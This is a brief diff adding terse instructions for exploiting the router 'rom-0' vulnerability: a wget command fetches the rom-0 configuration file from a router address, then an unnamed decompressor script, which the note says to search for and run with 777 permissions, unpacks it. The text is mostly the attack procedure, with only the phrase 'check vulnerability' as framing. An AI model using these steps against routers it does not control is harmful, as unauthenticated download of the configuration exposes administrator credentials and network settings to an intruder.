@@ -1,0 +1,11 @@
+1) to check rom-o vulnerability::::
+     :::in terminal:::
+
+           wget http://192.168.1.1/rom-0           //this will download rom-0 file of your router
+
+2) this file is not readable to use it copy script in a file with .py extension and give 777 permission:::
+        search for:::
+
+            configration decompressor for rom-0 file
+
+3) now run ::::       ./name.py 
